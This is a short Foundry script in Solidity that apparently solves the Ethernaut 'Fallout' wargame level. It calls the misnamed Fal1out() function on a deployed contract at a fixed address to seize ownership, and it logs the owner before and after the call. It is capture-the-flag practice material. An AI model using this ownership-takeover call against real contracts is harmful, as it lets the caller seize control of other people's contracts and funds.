// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../src/Fallout.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract FalloutSolution is Script {
    Fallout public falloutInstance = Fallout(0xAcC94dA2Da86beE4dd0cC2dCA842c81333a219B8);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Owner before: ", falloutInstance.owner());
        console.log("Player", vm.envAddress("MY_ADDRESS"));

        falloutInstance.Fal1out();

        console.log("Owner after: ", falloutInstance.owner());
        
        vm.stopBroadcast();
    }
}